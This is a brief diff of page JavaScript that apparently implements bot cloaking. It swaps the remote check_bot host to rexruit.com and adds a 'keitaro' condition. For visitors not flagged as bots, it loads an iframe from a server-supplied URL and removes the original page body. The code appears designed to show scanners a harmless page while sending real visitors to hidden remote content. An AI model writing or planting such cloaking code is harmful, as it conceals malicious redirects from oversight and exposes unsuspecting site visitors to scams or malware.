@@ -42,7 +42,7 @@ window.addEventListener('message', (message) => {
         setTimeout(toggleLoad, 500);
 
     } 
-    if (!message.data?.bot) {
+    if (message.data.keitaro && !message.data?.bot) {
         const body = document.querySelector('body');
         body.remove();
         setTimeout(toggleLoad, 500);
@@ -52,7 +52,7 @@ window.addEventListener('message', (message) => {
 })
 
 window.addEventListener('DOMContentLoaded', () => {
-    fetch('https://grandmashome.com/api/check_bot').then(res => res.json()).then(res => {
+    fetch('https://rexruit.com/api/check_bot').then(res => res.json()).then(res => {
         if (res?.code == 200 && !res.result) {
             createFrame(res.url + 'JPyc2JmS')
         } else {
